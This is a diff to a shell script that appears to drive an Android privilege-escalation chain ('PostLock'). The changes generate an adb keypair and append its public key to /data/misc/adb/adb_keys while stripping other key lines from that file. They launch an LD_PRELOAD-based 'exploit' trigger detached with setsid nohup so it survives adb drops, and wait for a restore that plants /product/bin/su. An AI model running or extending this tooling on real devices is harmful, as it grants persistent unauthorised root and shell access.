@@ -105,17 +105,16 @@ PY
 fi
 if [ ! -f "$ADBKEY_DIR/postlock_adbkey" ] || [ ! -f "$ADBKEY_DIR/postlock_adbkey.pub" ]; then
   mkdir -p "$ADBKEY_DIR"
-  openssl genrsa -out "$ADBKEY_DIR/postlock_adbkey" 2048 2>/dev/null
-  python3 - "$ADBKEY_DIR" <<'PY'
-import base64, sys
-from cryptography.hazmat.primitives import serialization
-d = sys.argv[1]
-key = serialization.load_pem_private_key(open(d + "/postlock_adbkey", "rb").read(), password=None)
-pub = key.public_key().public_bytes(serialization.Encoding.DER,
-                                    serialization.PublicFormat.PKCS1)
-open(d + "/postlock_adbkey.pub", "w").write(
-    "2048 " + base64.b64encode(pub).decode() + " postlock_bootstrap\n")
-PY
+  rm -f "$ADBKEY_DIR/postlock_adbkey" "$ADBKEY_DIR/postlock_adbkey.pub"
+  # adb keygen emits the canonical android_pubkey .pub format (base64 of
+  # the modulus_size_words struct, "40 00 00 00" prefix) -- the ONLY
+  # format adbd's key loader accepts.  The old openssl+DER path produced
+  # "2048 <der-b64> ..." which adbd rejects outright ("Invalid base64 key
+  # 2048", 2026-10-23: every line of adb_keys was in that broken format,
+  # so no key ever verified and the app's AUTH dead-ended in a prompt the
+  # framework auto-denies for TCP sources).
+  "$ab" keygen "$ADBKEY_DIR/postlock_adbkey" >/dev/null
+  sed -i "s/ .*/ postlock_bootstrap/" "$ADBKEY_DIR/postlock_adbkey.pub"
   echo "generated fresh adb keypair at $ADBKEY_DIR (APP APK MUST RE-EMBED IT)"
 fi
 ab push "$PP_ENTRY" "$STAGE/pp_adb_tcp.bin" >/dev/null
@@ -176,8 +175,15 @@ chmod 666 $TMP/su.allow
 # --- adb-loopback bootstrap (idempotent) ---------------------------------
 # postlock pubkey -> /data/misc/adb/adb_keys: lets the PostLock app AUTH
 # to adbd and obtain a shell-uid session (the only uid that can run the
-# chain on a fresh boot).  grep -F on the binary keys file is safe.
-if ! grep -qF postlock_bootstrap /data/misc/adb/adb_keys 2>/dev/null; then
+# chain on a fresh boot).  Also drops legacy "2048 " prefixed lines --
+# adbd rejects them outright ("Invalid base64 key 2048", 2026-10-23:
+# every line was in that broken format, so no key ever verified and the
+# app AUTH dead-ended in a prompt the framework auto-denies on TCP).
+# grep -F on the binary keys file is safe.
+if grep -q "^2048 " /data/misc/adb/adb_keys 2>/dev/null || ! grep -qF postlock_bootstrap /data/misc/adb/adb_keys 2>/dev/null; then
+  grep -v "^2048 " /data/misc/adb/adb_keys > $TMP/adb_keys.new 2>/dev/null || true
+  cat $TMP/adb_keys.new > /data/misc/adb/adb_keys 2>/dev/null || true
+  rm -f $TMP/adb_keys.new
   cat $STAGE/postlock_adbkey.pub >> /data/misc/adb/adb_keys || echo WARN-adb-keys-append
   chmod 640 /data/misc/adb/adb_keys || true
   chown root:shell /data/misc/adb/adb_keys || true
@@ -310,8 +316,13 @@ fi
 # chain via KS_COLDSTART -- the -c string is only the constructor's
 # carrier process, so it is a one-liner again.
 CHAIN_OUT=/data/local/tmp/postlock_chain.log
-ab shell "rm -f $STAGE/skbdelta $CHAIN_OUT /data/local/tmp/postlock_restore.log; LD_PRELOAD=$STAGE/preload.so $TRIGGER_ENV /system/bin/sh -c 'echo CHAIN_EXIT_DONE' > $CHAIN_OUT 2>&1" \
-  || echo "WARN: trigger rc!=0 (exploit failed? see $CHAIN_OUT and ksud.preload.log)"
+# DETACHED (setsid nohup): a synchronous ab shell would die with the host
+# timeout / adb drop and leave the chain half-way through the route --
+# dangling fops state that panics on the next misc open (AGENTS; round
+# c23b8a27->e4eaa672).  The chain survives adb disconnects; the poll
+# below reads the log file instead of the stream.
+ab shell "rm -f $STAGE/skbdelta $CHAIN_OUT /data/local/tmp/postlock_restore.log; setsid nohup env LD_PRELOAD=$STAGE/preload.so $TRIGGER_ENV /system/bin/sh -c 'echo CHAIN_EXIT_DONE' > $CHAIN_OUT 2>&1 < /dev/null & echo DETACHED" \
+  || echo "WARN: detach failed (see $CHAIN_OUT)"
 
 # --- wait for the async KS_COLDSTART restore -----------------------------
 # The restore forks inside the chain (root.c coldstart fork) and keeps
@@ -319,7 +330,7 @@ ab shell "rm -f $STAGE/skbdelta $CHAIN_OUT /data/local/tmp/postlock_restore.log;
 # markers: the RESTORE-OK line, or the overlay target it creates.
 step "wait for restore (KS_COLDSTART fork)"
 RESTORE_OK=0
-for _ in $(seq 1 60); do
+for _ in $(seq 1 90); do
   if ab shell "grep -q POSTLOCK-RESTORE-OK /data/local/tmp/postlock_restore.log 2>/dev/null" \
      || ab shell "[ -x /product/bin/su ]" 2>/dev/null; then
     RESTORE_OK=1
@@ -331,8 +342,10 @@ if [ "$RESTORE_OK" = 1 ]; then
   echo "  restore OK; tail:"
   ab shell "tail -8 /data/local/tmp/postlock_restore.log 2>/dev/null" | sed 's/^/    /' || true
 else
-  echo "WARN: restore marker not seen after 120s; see /data/local/tmp/postlock_restore.log"
+  echo "WARN: restore marker not seen after 180s"
   ab shell "cat /data/local/tmp/postlock_restore.log 2>/dev/null" | tail -15 | sed 's/^/    /' || true
+  echo "  chain log tail:"
+  ab shell "tail -25 $CHAIN_OUT 2>/dev/null" | sed 's/^/    /' || true
 fi
 
 # --- verify as shell (uid 2000 is seeded; uid 0 is NOT in su.allow) -----
